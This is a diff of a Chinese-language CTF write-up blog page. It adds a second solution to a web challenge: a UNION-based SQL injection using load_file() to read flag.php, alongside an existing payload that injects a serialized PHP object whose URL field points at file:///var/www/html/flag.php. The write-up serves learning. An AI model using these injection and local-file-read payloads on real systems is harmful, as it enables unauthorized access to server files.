@@ -27,7 +27,7 @@
 <meta property="og:description" content="[SUCTF 2019]CheckIn传正常图片提示里面有&lt;?不给传，传码看看： 12345678910111213141516171819202122232425POST &#x2F;index.php HTTP&#x2F;1.1Host: 5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81Content-Length: 407Cache-Contro">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-05-07T05:05:02.000Z">
-<meta property="article:modified_time" content="2025-05-07T05:06:56.661Z">
+<meta property="article:modified_time" content="2025-05-07T05:23:51.007Z">
 <meta property="article:author" content="aidemofashi">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -361,6 +361,10 @@
 <p>这是时候如wp说的，在data里构造一条读取本地flag的链接即可  </p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">-<span class="hljs-number">1</span> union/**/<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;zhong&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27; from users <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 <p>网页会在blog的区域回显blog链接爬取到的页面，改为file:&#x2F;&#x2F;可以直接访问本地的flag.php源码，所以在f12中查看blog窗口元素即可看，可能是它这个题目的原因，正常的blog也无法显示<br>只能在源码查看了  </p>
+<p>解法二：<br>时用sql的load_file()函数，直接读取flag.php<br>注入时传入：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,load_file(&quot;/var/www/html/flag.php&quot;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+
 <h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>file:&#x2F;&#x2F;&#x2F;<br>中是有3个&#x2F;  </p>
 <p>还有，为什么传入sql语句<br>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –<br>就能访问到flag.php<br>首先select语句若是没有搜索到东西会自己变成自己添加的数据<br>所以-1没搜索到，会等于自己新建一条数据发给后端语句<br>原语句：  </p>
 <p>-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”zhong”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ from users –</p>
